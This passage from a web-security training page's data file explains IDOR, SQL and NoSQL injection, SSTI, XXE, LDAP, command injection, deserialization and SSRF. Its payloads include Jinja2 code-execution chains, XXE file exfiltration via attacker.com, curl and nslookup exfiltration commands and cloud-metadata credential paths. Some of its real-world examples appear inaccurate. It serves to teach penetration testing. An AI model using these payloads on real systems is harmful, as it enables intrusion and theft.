**Understanding the Vulnerability**: Consider an API endpoint /api/invoices/12345 that returns invoice details. The application authenticates you (confirms you're logged into some account) but might not authorize you (verify that invoice 12345 belongs to YOUR account). If you can change 12345 to 12346 and see someone else's invoice, that's IDOR/BOLA.

**Horizontal vs Vertical Privilege Escalation**: Horizontal escalation means accessing other users' data at the same privilege level (user A accessing user B's invoices). Vertical escalation means accessing higher-privilege functionality (regular user accessing admin panels). Both are critical, but vertical escalation typically has higher impact.

**Finding Identifiers**: Look for object references everywhere: URL paths (/users/123), query parameters (?id=abc), POST body data ({"user_id":"xyz"}), cookies, and headers. IDs can be numeric (1, 2, 3 - easy to enumerate), UUIDs (harder to guess but often leaked elsewhere), or encoded values (base64, which can be decoded). Don't assume UUIDs are unguessable - they might be leaked in API responses, emails, or client-side storage.

**Mass Assignment**: A related vulnerability where the application binds user input directly to internal objects. If a user profile update accepts {"name":"John", "email":"john@test.com"}, try adding {"role":"admin"} or {"balance":999999}. The application might update fields it shouldn't.

**Testing Methodology**: The most effective approach uses two accounts - one "attacker" and one "victim." Perform actions as the victim (view invoices, update profile), capture the requests, then replay them using the attacker's session while referencing the victim's object IDs. If the attacker can access or modify the victim's data, you've found IDOR.

**API-First Applications**: Modern SPAs and mobile apps rely heavily on APIs where IDOR is especially common. GraphQL APIs deserve special attention - a single query might fetch multiple resources, and authorization checks might be missing on nested objects. Also test batch endpoints (/api/invoices?ids=1,2,3) which might have different authorization logic than single-item endpoints.

**Function-Level Access Control**: Beyond data access, test if administrative functions are protected. Can a regular user access /admin/* endpoints? Can they invoke admin API actions by knowing the endpoint? Even if the UI doesn't show admin options, the backend might accept the requests.`,
    realWorldExample: "A researcher testing a major food delivery platform discovered that the order tracking API endpoint /api/orders/{order_id}/track only verified authentication, not authorization. By incrementing order IDs, they could view real-time GPS locations of delivery drivers for any order, plus customer names, addresses, and phone numbers. This affected millions of orders and earned a significant bug bounty.",
    beginnerTips: [
      "Always test with two accounts - use one to create resources, then try to access them from the other",
      "Look for identifiers in unexpected places: JSON responses often leak IDs you can then abuse",
      "Sequential numeric IDs are goldmines - try incrementing/decrementing by 1",
      "Test both GET (viewing) and POST/PUT/DELETE (modifying/deleting) operations",
      "Check if UUIDs are leaked elsewhere (registration emails, API responses, JavaScript files)",
      "Use Burp's Autorize extension to automate IDOR testing across all captured requests"
    ],
    commonMistakes: [
      "Only testing ID parameters in URLs and missing IDs in request bodies or headers",
      "Assuming UUIDs are secure without checking if they're leaked or predictable",
      "Not testing delete/update operations - applications often check read but not write access",
      "Forgetting to test GraphQL nested queries and batch operations"
    ],
    keyPoints: [
      "Horizontal privilege escalation (accessing other users' data)",
      "Vertical privilege escalation (accessing admin functions)",
      "IDOR in API endpoints with numeric/UUID identifiers",
      "Mass assignment vulnerabilities",
      "Function-level access control bypass",
      "Path-based access control issues",
      "GraphQL authorization flaws",
    ],
    techniques: [
      "Swap user IDs, GUIDs, or other identifiers in requests",
      "Test with low-privilege and high-privilege accounts",
      "Check API endpoints for missing authorization checks",
      "Test batch operations and bulk endpoints",
      "Enumerate object IDs (sequential, predictable patterns)",
    ],
    cwe: ["CWE-639: Authorization Bypass Through User-Controlled Key", "CWE-284: Improper Access Control"],
  },
];

// Section 3: Injection Attacks
const injectionTopics: TopicSection[] = [
  {
    title: "Advanced SQL Injection",
    icon: <StorageIcon />,
    color: "#ef4444",
    description: "Beyond basic SQLi: blind techniques, filter bypass, and database-specific exploitation.",
    detailedDescription: `SQL Injection remains one of the most dangerous and prevalent web vulnerabilities, consistently appearing in OWASP Top 10. While basic SQLi (adding a single quote to break queries) is well-known, real-world exploitation often requires advanced techniques to bypass modern defenses.

**Union-Based SQLi**: When error messages and query results are visible in the response, UNION attacks allow extracting data from other tables. First, determine the number of columns in the original query (using ORDER BY or UNION SELECT NULL...), then craft a payload like: ' UNION SELECT username, password, null FROM users--. The extracted data appears in the normal page output.

**Blind SQL Injection**: When the application doesn't display query results or errors, you must infer information through application behavior. **Boolean-based blind** uses true/false conditions: ' AND 1=1-- returns normal page, ' AND 1=2-- returns different page. By asking yes/no questions about each character, you can extract entire databases character by character. **Time-based blind** uses delays: ' AND IF(1=1, SLEEP(5), 0)--. If the page takes 5 seconds to respond, you know the condition was true.

**Error-Based SQLi**: Some databases include query results in error messages. In MySQL: ' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- might reveal the database user in the error. PostgreSQL and MSSQL have their own error-based techniques.

**Out-of-Band (OOB) Exfiltration**: When the application has no visible output and time delays are unreliable, use DNS or HTTP requests to exfiltrate data. In MySQL: LOAD_FILE(CONCAT('\\\\\\\\',user(),'.attacker.com\\\\a')). The database username appears as a DNS lookup to attacker.com, which you monitor.

**Second-Order SQLi**: The payload is stored in the database and executes when retrieved in a different context. For example, registering with username admin'-- might work fine, but when an admin panel queries that username without sanitization, injection occurs. These are often missed by automated scanners.

**WAF Bypass**: Modern applications use Web Application Firewalls. Bypass techniques include: case variation (SeLeCt), comments (SEL/**/ECT), encoding (URL encode, Unicode, hex), alternative syntax (MySQL's /*!SELECT*/), and whitespace alternatives (using tabs, newlines, or /**/ instead of spaces).`,
    realWorldExample: "In 2019, Fortnite's login system had a blind SQL injection vulnerability. By manipulating the login request with time-based payloads, security researchers demonstrated they could extract user credentials from Epic Games' database. The vulnerability affected millions of accounts and could have been catastrophic if exploited maliciously.",
    beginnerTips: [
      "Start with the easiest detection: add a single quote (') and look for SQL errors",
      "Use SQLMap for automation, but understand manual techniques first - you'll need them for WAF bypass",
      "Always identify the database type first (MySQL, PostgreSQL, MSSQL, Oracle) - payloads are database-specific",
      "Test all input points: GET/POST parameters, cookies, headers, and JSON/XML body data",
      "Check for second-order SQLi by injecting in fields that might be used later (usernames, profile fields)",
      "If blocked by WAF, try alternative encodings and syntax - every WAF has bypass techniques"
    ],
    commonMistakes: [
      "Only testing visible form fields and missing hidden parameters or API endpoints",
      "Giving up when initial payloads fail without trying WAF bypass techniques",
      "Not using time-based blind testing when error-based and union-based fail",
      "Forgetting that JSON and XML APIs can also be vulnerable to SQLi"
    ],
    keyPoints: [
      "Union-based extraction techniques",
      "Boolean-based blind SQLi",
      "Time-based blind SQLi",
      "Error-based extraction",
      "Out-of-band (OOB) data exfiltration",
      "Second-order SQL injection",
      "WAF bypass techniques",
    ],
    tools: ["SQLMap", "Burp Suite", "Havij", "jSQL Injection"],
    techniques: [
      "Filter bypass: case variation, comments, encoding",
      "Stacked queries for command execution",
      "Database fingerprinting via errors",
      "Reading/writing files via SQL (LOAD_FILE, INTO OUTFILE)",
      "Privilege escalation via database features",
    ],
    cwe: ["CWE-89: SQL Injection"],
  },
  {
    title: "NoSQL Injection",
    icon: <DataObjectIcon />,
    color: "#f59e0b",
    description: "Injection attacks against MongoDB, CouchDB, and other NoSQL databases.",
    detailedDescription: `NoSQL databases (MongoDB, CouchDB, Redis, Cassandra) were initially thought to be immune to injection attacks because they don't use SQL. This is dangerously wrong. NoSQL databases have their own query languages and operators that can be manipulated.

**MongoDB Operator Injection**: MongoDB queries use operators like $gt (greater than), $ne (not equal), $regex (pattern matching). If user input is inserted into queries without validation, attackers can inject operators. A login query like db.users.find({user: req.body.user, pass: req.body.pass}) becomes vulnerable when the attacker sends {"user":"admin", "pass":{"$ne":""}}. This finds users where username is "admin" and password is NOT empty - effectively bypassing authentication.

**JSON Parameter Pollution**: Many applications send data as JSON. If the server expects a string but receives an object, unexpected behavior occurs. Change username=admin&password=test to: {"username":"admin", "password":{"$gt":""}}. The application might interpret the object as a MongoDB operator.

**JavaScript Injection ($where)**: MongoDB allows JavaScript execution in queries via the $where operator. If user input reaches $where: db.users.find({$where: "this.username == '" + user_input + "'"}), an attacker can inject: admin' || true || 'a'=='a to bypass authentication, or even execute arbitrary JavaScript on the server.

**Blind NoSQL Injection**: Like blind SQLi, when results aren't directly visible, use true/false conditions or timing. For regex-based extraction: {"password":{"$regex":"^a"}} vs {"password":{"$regex":"^b"}} - different responses reveal the first character. Repeat for each position to extract complete values.

**Redis Command Injection**: Redis is often exposed internally. If an application passes user input to Redis commands: redis.set(user_input, value), injecting: key\\r\\nFLUSHALL\\r\\nSET can inject additional commands. This can delete all data or write malicious data.

**GraphQL Injection**: While technically a query language rather than NoSQL, GraphQL is commonly backed by NoSQL databases. Test for injection in query variables, and look for introspection queries that reveal the entire schema.`,
    realWorldExample: "A security audit of a popular Node.js application revealed that the authentication endpoint accepted JSON objects for password comparison. By sending {\"password\":{\"$gt\":\"\"}}, attackers could authenticate as any user without knowing the password. The vulnerability existed because the code used req.body.password directly in a MongoDB query without type checking.",
    beginnerTips: [
      "If the application accepts JSON, try replacing string values with objects containing operators: {\"$gt\":\"\"}",
      "Look for login forms - NoSQL injection auth bypass is extremely common",
      "Test $ne (not equal), $gt (greater than), $regex for operator injection",
      "If JavaScript appears in queries or errors, test for $where injection",
      "Use Burp to modify Content-Type to application/json and send object payloads"
    ],
    commonMistakes: [
      "Assuming NoSQL databases are immune to injection because they don't use SQL",
      "Only testing with string payloads and not trying operator objects",
      "Forgetting that array inputs can also trigger unexpected behavior"
    ],
    keyPoints: [
      "MongoDB operator injection ($gt, $ne, $regex)",
      "JSON/BSON injection in queries",
      "JavaScript injection in MongoDB",
      "CouchDB view injection",
      "Redis command injection",
      "GraphQL query manipulation",
    ],
    techniques: [
      "Replace values with objects: {\"$gt\": \"\"}",
      "Array injection for operator bypass",
      "Regex-based data extraction",
      "Server-side JavaScript injection via $where",
      "Blind NoSQL injection via timing",
    ],
    cwe: ["CWE-943: Improper Neutralization of Special Elements in Data Query Logic"],
  },
  {
    title: "Server-Side Template Injection (SSTI)",
    icon: <CodeIcon />,
    color: "#8b5cf6",
    description: "Exploiting template engines to achieve remote code execution.",
    detailedDescription: `Server-Side Template Injection occurs when user input is embedded directly into template syntax before rendering. Unlike XSS (which executes in the browser), SSTI executes on the server, often leading to Remote Code Execution (RCE). It's one of the most severe vulnerabilities you can find.

**Understanding Template Engines**: Web applications use template engines (Jinja2 for Python, Twig for PHP, FreeMarker for Java, ERB for Ruby, etc.) to dynamically generate HTML. The template contains placeholders like {{variable}} that get replaced with actual values. The vulnerability occurs when user input becomes part of the template itself, not just a value within it.

**Vulnerable vs Safe Code**:
Vulnerable: render_template_string("Hello " + user_input)
Safe: render_template_string("Hello {{name}}", name=user_input)
In the vulnerable version, if user_input is {{7*7}}, it's evaluated as template syntax, outputting 49.

**Detection Process**: Use a decision tree approach:
1. First, test mathematical expressions: {{7*7}}, \${7*7}, <%= 7*7 %>, #{7*7}, *{7*7}
2. If 49 appears, you've found SSTI and identified the syntax
3. If mathematical expressions fail, try {{7*'7'}} (Jinja2 returns 7777777, Twig returns 49)
4. Error messages often reveal the template engine and framework

**Exploitation - Jinja2 (Python)**: Jinja2 is extremely common in Flask applications. The goal is to access Python's object hierarchy to reach dangerous functions. Basic payload chain:
{{''.__class__.__mro__[1].__subclasses__()}} - Lists all classes
Find subprocess.Popen or os module in the list, then:
{{''.__class__.__mro__[1].__subclasses__()[X]('id',shell=True,stdout=-1).communicate()}}
Where X is the index of Popen. This executes arbitrary shell commands.

**Exploitation - Other Engines**:
- Twig (PHP): {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
- FreeMarker (Java): <#assign ex="freemarker.template.utility.Execute"?new()>\${ex("id")}
- ERB (Ruby): <%= system('id') %>
- Velocity (Java): #set($x='')##$x.getClass().forName('java.lang.Runtime')...

**Sandbox Escapes**: Some template engines implement sandboxes restricting dangerous operations. These can often be bypassed through creative object traversal, accessing internal attributes, or exploiting misconfigurations. Research sandbox escapes specific to the template engine you're targeting.`,
    realWorldExample: "Uber had an SSTI vulnerability in their Jinja2 templates where a user's registered name was embedded directly into email templates. A researcher registered with the name {{7*7}} and received an email greeting them as 49. By escalating to RCE payloads, they demonstrated complete server compromise and earned a $10,000 bounty.",
    beginnerTips: [
      "Test everywhere user input might be reflected in pages or emails: names, profile fields, error messages",
      "Use tplmap or SSTImap tools to automate detection and exploitation",
      "If {{7*7}} doesn't work, try other syntaxes: ${7*7}, <%= 7*7 %>, #{7*7}",
      "Identify the framework (Flask/Django/Spring/Rails) to narrow down template engine possibilities",
      "Error messages are goldmines - they often reveal the exact template engine and payload hints"
    ],
    commonMistakes: [
      "Only testing visible page output - SSTI can appear in emails, PDFs, error pages",
      "Giving up after testing one template syntax - applications might use multiple engines",
      "Not checking for blind SSTI via time delays or out-of-band connections"
    ],
    keyPoints: [
      "Template engine identification",
      "Jinja2/Twig/Freemarker exploitation",
      "Sandbox escape techniques",
      "Blind SSTI detection",
      "Polyglot payloads for detection",
    ],
    tools: ["Tplmap", "SSTImap", "Burp Suite"],
    techniques: [
      "Detection: {{7*7}}, ${7*7}, <%= 7*7 %>",
      "Jinja2 RCE: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
      "Identify template engine via error messages",
      "Chain object traversal for RCE",
    ],
    cwe: ["CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine"],
  },
  {
    title: "XXE Injection",
    icon: <DescriptionIcon />,
    color: "#10b981",
    description: "XML External Entity attacks for file disclosure, SSRF, and denial of service.",
    detailedDescription: `XML External Entity (XXE) injection exploits features of XML parsers to read local files, perform server-side requests, or cause denial of service. It's especially dangerous because XML is used in many places you might not expect: SOAP APIs, SVG images, Office documents (DOCX/XLSX are ZIP files containing XML), and RSS feeds.

**Understanding XML Entities**: XML allows defining entities - essentially variables that get replaced when the document is parsed. Internal entities are defined within the document: <!ENTITY name "value">. External entities reference external resources: <!ENTITY name SYSTEM "file:///etc/passwd">. When the parser encounters &name; in the document, it replaces it with the entity's value - which could be the contents of /etc/passwd.

**Basic XXE Payload**:
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>

When parsed, &xxe; is replaced with the contents of /etc/passwd, which might appear in the response.

**XXE to SSRF**: Replace the file:// URI with http:// to make the server fetch arbitrary URLs:
<!ENTITY xxe SYSTEM "http://internal-server:8080/admin">
This can access internal services, cloud metadata (http://169.254.169.254/latest/meta-data/), or confirm blind XXE via DNS/HTTP callbacks to your server.

**Blind XXE with Out-of-Band Exfiltration**: When the entity's value doesn't appear in the response, use external DTDs to exfiltrate data:
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
The evil.dtd on your server contains:
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;
This causes the server to send file contents to your server as a URL parameter.

**XXE via File Upload**: Many applications process uploaded files containing XML:
- SVG images: SVG is XML, so uploading a malicious SVG can trigger XXE
- DOCX/XLSX/PPTX: Office documents are ZIP files containing XML - modify the XML inside
- PDF: Some PDF parsers process embedded XML
- SOAP endpoints: Obvious XML, but often overlooked in modern testing

**Billion Laughs DoS**: Entity expansion attack that causes exponential memory consumption through nested entity references.`,
    realWorldExample: "In Facebook's Career portal, researchers discovered that the resume upload feature processed DOCX files server-side. By modifying the XML inside a DOCX file to include an XXE payload, they could read arbitrary files from Facebook's servers and make SSRF requests to internal infrastructure. Facebook paid $33,500 for this critical vulnerability.",
    beginnerTips: [
      "Look for any XML processing: SOAP APIs, file uploads (SVG, DOCX), RSS imports, SAML requests",
      "Change Content-Type to application/xml and send XML payloads to JSON endpoints - some accept both",
      "If direct XXE fails, try blind XXE with an external DTD hosted on your server",
      "Use Burp Collaborator or interactsh to detect blind XXE via DNS/HTTP callbacks",
      "Don't forget file uploads - extracting and modifying XML in Office documents is a common vector"
    ],
    commonMistakes: [
      "Only testing obvious XML endpoints and missing file uploads or content-type switching",
      "Not trying blind XXE when classic XXE shows no output",
      "Forgetting that DOCX/XLSX/PPTX files contain XML and are common XXE vectors"
    ],
    keyPoints: [
      "Classic XXE for file reading",
      "Blind XXE with out-of-band exfiltration",
      "XXE via file upload (SVG, DOCX, XLSX)",
      "XXE in SOAP web services",
      "Parameter entity attacks",
      "XXE to SSRF escalation",
    ],
    techniques: [
      "Basic payload: <!ENTITY xxe SYSTEM \"file:///etc/passwd\">",
      "Blind exfil via external DTD",
      "Error-based XXE for data extraction",
      "XXE DoS via billion laughs attack",
      "Test in Content-Type: application/xml requests",
    ],
    cwe: ["CWE-611: Improper Restriction of XML External Entity Reference"],
  },
  {
    title: "LDAP Injection",
    icon: <AccountTreeIcon />,
    color: "#6366f1",
    description: "Manipulating LDAP queries to bypass authentication or extract directory data.",
    detailedDescription: `LDAP (Lightweight Directory Access Protocol) is used by organizations to store user information and manage authentication, often integrated with Active Directory. LDAP injection occurs when user input is incorporated into LDAP queries without proper sanitization.

**Understanding LDAP Queries**: LDAP uses a search filter syntax to find entries. A typical authentication query looks like: (&(uid=USERNAME)(password=PASSWORD)). The & means AND - both conditions must be true. If an application concatenates user input directly into this query, injection is possible.

**Authentication Bypass**: The most common LDAP injection goal is bypassing authentication. Payloads like:
- admin)(&) - Closes the filter early, making it always match admin
- *)(uid=*))(|(uid=* - Wildcard injection to match any user
- admin)(|(password=*) - OR condition that's always true

**Data Extraction**: Unlike SQL databases, LDAP doesn't return query results the same way. However, blind techniques can extract data:
- Wildcard enumeration: Test (uid=a*), (uid=b*), etc. to enumerate usernames
- Boolean-based: Different responses for valid vs invalid queries reveal information

**Enterprise Context**: LDAP injection often targets enterprise environments where Active Directory backs authentication. Successful exploitation can mean access to all corporate accounts.`,
    realWorldExample: "A penetration test of a corporate intranet discovered the employee directory search used LDAP. By injecting *)(&) into the search field, the tester bypassed search restrictions and dumped the entire directory, including hidden accounts for service principals and admin accounts that shouldn't have been visible.",
    beginnerTips: [
      "Look for login forms in enterprise/corporate applications - these often use LDAP",
      "Try basic payloads: *)(&), *)(uid=*), admin)(|(",
      "Test wildcard enumeration by iterating through characters",
      "Check for LDAP in applications integrated with Active Directory or corporate directories"
    ],
    commonMistakes: [
      "Only testing web applications and missing thick clients or legacy apps using LDAP",
      "Not recognizing LDAP-backed authentication in enterprise environments",
      "Giving up if basic payloads fail - LDAP implementations vary"
    ],
    keyPoints: [
      "Authentication bypass via filter manipulation",
      "Data extraction from directory services",
      "Blind LDAP injection techniques",
      "AND/OR filter exploitation",
    ],
    techniques: [
      "Bypass: *)(&, *)(|, admin)(&)",
      "Wildcard extraction: a*, b*, c*...",
      "Boolean-based blind extraction",
      "Test in login forms using LDAP backends",
    ],
    cwe: ["CWE-90: LDAP Injection"],
  },
  {
    title: "ORM and Query Builder Issues",
    icon: <DataObjectIcon />,
    color: "#ec4899",
    description: "Vulnerabilities in Object-Relational Mappers and query construction libraries.",
    detailedDescription: `Object-Relational Mappers (ORMs) like Sequelize, Prisma, SQLAlchemy, ActiveRecord, and Entity Framework are designed to prevent SQL injection by abstracting database queries. However, they can still be vulnerable when misused.

**The False Sense of Security**: Developers often believe using an ORM automatically prevents injection. While ORMs parameterize most queries by default, they also provide methods for raw queries, dynamic column names, and other features that can reintroduce vulnerabilities.

**Raw Query Methods**: Most ORMs have escape hatches for raw SQL:
- Sequelize: sequelize.query("SELECT * FROM users WHERE id = " + id)
- ActiveRecord: User.where("name = '" + params[:name] + "'")
- SQLAlchemy: engine.execute("SELECT * FROM users WHERE id = " + id)
These bypass ORM protections entirely.

**Column and Table Name Injection**: ORMs typically don't parameterize identifiers (table/column names). If an application allows users to specify sort columns: User.order(params[:sort_by]) - an attacker might inject: "id; DROP TABLE users--"

**Mass Assignment**: Not strictly injection, but ORM-related. When an ORM automatically maps request parameters to model attributes, attackers can modify fields they shouldn't:
User.create(req.body) might allow setting {role: "admin"} if role isn't protected.

**JSON Field Queries**: Modern databases support JSON columns, and ORM queries against JSON fields often have different security characteristics. Test operators like ->, ->>, @>, and #> for injection.`,
    realWorldExample: "A Rails application used ActiveRecord's where method with a user-controlled sort parameter. The developer assumed ORM = safe, but ActiveRecord.order() doesn't sanitize column names. By injecting 'id; SELECT pg_sleep(10)--' as the sort parameter, researchers demonstrated SQL injection despite the application using an ORM throughout.",
    beginnerTips: [
      "Identify the ORM in use from error messages, stack traces, or source code",
      "Search the codebase for raw(), literal(), execute(), or direct SQL strings",
      "Test any user-controlled column/table names - these are rarely parameterized",
      "Look for mass assignment by adding unexpected fields to POST requests"
    ],
    commonMistakes: [
      "Assuming applications using ORMs are immune to SQL injection",
      "Missing raw query methods hidden in the codebase",
      "Not testing ORDER BY, GROUP BY, or other clauses where identifiers are used"
    ],
    keyPoints: [
      "Raw query usage in ORMs",
      "Unsafe interpolation in query builders",
      "Mass assignment leading to injection",
      "Order by and column name injection",
      "JSON field query injection",
    ],
    techniques: [
      "Identify ORM (Sequelize, Prisma, SQLAlchemy, ActiveRecord)",
      "Test dynamic column/table names",
      "Check for raw() or literal() query methods",
      "Test JSON operators for injection",
    ],
  },
  {
    title: "Command and Header Injection",
    icon: <TerminalIcon />,
    color: "#dc2626",
    description: "OS command injection and HTTP header injection attacks.",
    detailedDescription: `Command injection occurs when an application passes user input to system shell commands. This is one of the most severe vulnerabilities - successful exploitation typically means complete server compromise with the ability to execute arbitrary code.

**OS Command Injection**: Applications sometimes execute shell commands for tasks like file conversion, network diagnostics, or interacting with external tools. If user input reaches these commands unsanitized, attackers can inject additional commands.

**Command Separators and Chaining**:
- Semicolon (;): Executes both commands: ping 127.0.0.1; whoami
- AND (&&): Second runs if first succeeds: ping 127.0.0.1 && whoami
- OR (||): Second runs if first fails: ping invalid || whoami
- Pipe (|): Pipes output: ping 127.0.0.1 | whoami
- Newline (%0a): Some parsers split on newlines
- Backticks or $(): Command substitution: ping \`whoami\` or ping $(whoami)

**Blind Command Injection**: When output isn't visible, use:
- Time delays: ; sleep 10 (if page takes 10 seconds, you have injection)
- DNS lookups: ; nslookup attacker.com (monitor your DNS server)
- Out-of-band HTTP: ; curl http://attacker.com/$(whoami)

**Argument Injection**: Even when the command itself is hardcoded, if arguments come from user input, you might inject flags:
convert image.png -resize $(whoami) might become:
convert image.png -resize 100x100 --output /tmp/shell.php

**HTTP Header Injection (CRLF)**: Injecting carriage return + line feed (\\r\\n or %0d%0a) into HTTP headers can:
- Add arbitrary headers: header%0d%0aX-Injected: value
- Split responses: Create entirely new HTTP responses
- Enable XSS: Inject Content-Type and body content

**Host Header Attacks**: Manipulating the Host header can:
- Access virtual hosts: Change Host to see different sites on same server
- Poison password reset links: If reset emails include the Host header value
- Cache poisoning: Inject malicious content into CDN caches`,
    realWorldExample: "A popular image processing service allowed users to specify output formats. The backend used ImageMagick with user input in the command. By submitting a filename like 'output.png; curl http://attacker.com/$(cat /etc/passwd | base64)', the researcher exfiltrated server credentials, demonstrating full command execution.",
    beginnerTips: [
      "Look for features that might use shell commands: file conversion, ping/traceroute, PDF generation",
      "Test all command separators: ;, &&, ||, |, newlines, backticks, $()",
      "If output isn't visible, use time-based detection: ; sleep 10",
      "For CRLF, URL encode: %0d%0a is carriage return + line feed",
      "Test Host header manipulation on login and password reset pages"
    ],
    commonMistakes: [
      "Only testing semicolon when other separators might work",
      "Forgetting to test blind injection with time delays or out-of-band",
      "Not considering argument injection when the base command is hardcoded"
    ],
    keyPoints: [
      "Command chaining: ;, &&, ||, |, newlines",
      "Command substitution: $(cmd), `cmd`",
      "Argument injection: --flag injection",
      "HTTP header injection (CRLF)",
      "Host header attacks",
      "Email header injection",
    ],
    techniques: [
      "Test: ; whoami, | id, `sleep 5`",
      "CRLF: %0d%0a for header injection",
      "Host header: internal hostname access",
      "Email: recipient%0aBcc:attacker@evil.com",
    ],
    cwe: ["CWE-78: OS Command Injection", "CWE-113: HTTP Response Splitting"],
  },
];

// Section 4: Server-Side Attacks
const serverSideTopics: TopicSection[] = [
  {
    title: "Insecure Deserialization",
    icon: <DataObjectIcon />,
    color: "#ef4444",
    description: "Exploiting unsafe deserialization for RCE and other attacks.",
    detailedDescription: `Insecure deserialization occurs when applications deserialize (convert from stored format back to objects) untrusted data. This can lead to Remote Code Execution, authentication bypass, or denial of service. It's particularly dangerous because the malicious payload executes during the deserialization process itself - before any application logic can validate it.

**Understanding Serialization**: Applications serialize objects (convert to a storable format) for sessions, caching, or inter-process communication. Each language has its own format:
- Java: Binary format starting with rO0AB (base64) or 0xACED (hex)
- PHP: Text format like O:4:"User":2:{s:4:"name";s:5:"admin"...}
- Python pickle: Binary format, often base64 encoded
- .NET: Various formats including BinaryFormatter (AAEAAAD...) and ViewState

**Why It's Dangerous**: When deserializing, the language reconstructs objects and may call methods automatically (constructors, destructors, __wakeup in PHP, __reduce__ in Python). If attackers control the serialized data, they can craft objects that trigger dangerous operations during reconstruction.

**Gadget Chains**: Exploitation requires finding a "gadget chain" - a sequence of existing classes in the application or its libraries that, when combined, achieve code execution. Tools like ysoserial (Java), PHPGGC, and others contain pre-built chains for common libraries.

**Java Deserialization**: Java's ObjectInputStream is infamously vulnerable. Libraries like Commons Collections, Spring, and many others provide gadget chains. The ysoserial tool generates payloads for dozens of known chains. Test by replacing serialized cookies or parameters with ysoserial output.

**PHP Unserialize**: PHP's unserialize() can trigger __wakeup(), __destruct(), and __toString() magic methods. PHPGGC contains gadget chains for frameworks like Laravel, Symfony, and WordPress plugins.

**Python Pickle**: Pickle is inherently unsafe for untrusted data - it can execute arbitrary code during unpickling. Look for pickle.loads() on user-controlled data. Common in Flask sessions, Redis caching, and ML model loading.

**.NET ViewState**: ASP.NET ViewState can be exploited if MAC validation is disabled or the key is known. Recent vulnerabilities like CVE-2020-0688 in Exchange Server exploited known ViewState keys.`,
    realWorldExample: "The 2017 Equifax breach that exposed 147 million records was caused by Apache Struts deserialization vulnerability (CVE-2017-5638). Attackers sent a crafted Content-Type header containing a Java deserialization payload, achieving RCE on Equifax's servers. The vulnerability had a patch available for months before the breach.",
    beginnerTips: [
      "Learn to recognize serialized data: rO0AB (Java), O:4: (PHP), AAEAAAD (.NET)",
      "Check cookies, hidden form fields, and API parameters for serialized data",
      "Use ysoserial for Java, PHPGGC for PHP to generate test payloads",
      "For Java apps, try common gadget chains against libraries like Commons Collections",
      "Look for clues in error messages that reveal the deserializer being used"
    ],
    commonMistakes: [
      "Only testing obvious serialized parameters and missing those in headers or nested JSON",
      "Not trying multiple gadget chains - the right chain depends on available libraries",
      "Forgetting that base64 decoding might be needed before analysis"
    ],
    keyPoints: [
      "Java serialization (ObjectInputStream)",
      "PHP unserialize() vulnerabilities",
      "Python pickle exploitation",
      ".NET BinaryFormatter/ViewState",
      "Ruby Marshal vulnerabilities",
      "JSON deserialization gadgets",
    ],
    tools: ["ysoserial", "PHPGGC", "marshalsec", "Burp Deserialization Scanner"],
    techniques: [
      "Identify serialized data (magic bytes, base64 patterns)",
      "Java: rO0AB, .NET: AAEAAAD, PHP: O:4:",
      "Test with gadget chains for target framework",
      "Check ViewState MAC validation",
    ],
    cwe: ["CWE-502: Deserialization of Untrusted Data"],
  },
  {
    title: "Server-Side Request Forgery (SSRF)",
    icon: <CloudIcon />,
    color: "#8b5cf6",
    description: "Forcing servers to make requests to unintended destinations.",
    detailedDescription: `Server-Side Request Forgery (SSRF) occurs when an attacker can make the server send HTTP requests to arbitrary destinations. This turns the server into a proxy, allowing access to internal services, cloud metadata, and other resources that should be inaccessible from the outside.

**Why SSRF Matters**: Internal networks typically trust requests from internal IP addresses. By using SSRF, an attacker can bypass firewalls and access internal dashboards, databases, and admin panels. In cloud environments, SSRF can steal credentials from metadata services.

**Cloud Metadata Exploitation**: Cloud providers (AWS, GCP, Azure) expose instance metadata at http://169.254.169.254/. This metadata often contains temporary access credentials. Famous SSRF attacks against AWS:
- /latest/meta-data/iam/security-credentials/ - Lists IAM role names
- /latest/meta-data/iam/security-credentials/[role-name] - Returns temporary AWS credentials
These credentials can provide access to S3 buckets, databases, and other AWS resources.

**Protocol Smuggling**: Some SSRF implementations allow non-HTTP protocols:
- file:///etc/passwd - Read local files
- gopher:// - Send arbitrary data to any port (can exploit Redis, Memcached, internal APIs)
- dict:// - Another protocol for port scanning and protocol exploitation

**Bypass Techniques**: Applications often implement SSRF protections that can be bypassed:
- IP representation: 0x7f000001, 2130706433, 0177.0.0.1 all equal 127.0.0.1
- IPv6: [::1], [::ffff:127.0.0.1], [0:0:0:0:0:ffff:127.0.0.1]
- DNS rebinding: Register a domain that alternates between external and internal IPs
- Redirect bypass: Some apps follow redirects - host a redirect to internal addresses
- URL parsing tricks: http://127.0.0.1@evil.com or http://evil.com#@127.0.0.1

**Blind SSRF**: When you can't see the response, detect SSRF through:
- Time-based: Request a slow internal service vs a fast one
- Out-of-band: Make the server request your Burp Collaborator/webhook.site URL
- DNS: Even if HTTP fails, DNS lookups might work - check for lookups to your domain`,
    realWorldExample: "The 2019 Capital One breach exposed 100+ million customer records. An attacker exploited an SSRF vulnerability in a WAF (Web Application Firewall) to access the AWS metadata service at 169.254.169.254. They retrieved temporary IAM credentials, which provided access to S3 buckets containing massive amounts of customer data. The breach resulted in $80 million in fines.",
    beginnerTips: [
      "Look for URL parameters, webhook configurations, PDF generators, image fetchers - any feature that fetches URLs",
      "Always test the AWS metadata endpoint: http://169.254.169.254/latest/meta-data/",
      "Try localhost variations: 127.0.0.1, localhost, 0.0.0.0, [::1], 127.1",
      "Use Burp Collaborator to detect blind SSRF via DNS and HTTP callbacks",
      "When blocked, try IP encoding tricks: decimal (2130706433), hex (0x7f000001), octal (0177.0.0.1)"
    ],
    commonMistakes: [
      "Only testing HTTP and missing file:// for local file read",
      "Not trying protocol smuggling with gopher:// against internal services",
      "Giving up when localhost is blocked without trying bypass techniques"
    ],
    keyPoints: [
      "Basic SSRF to internal services",
      "Cloud metadata endpoint access (169.254.169.254)",
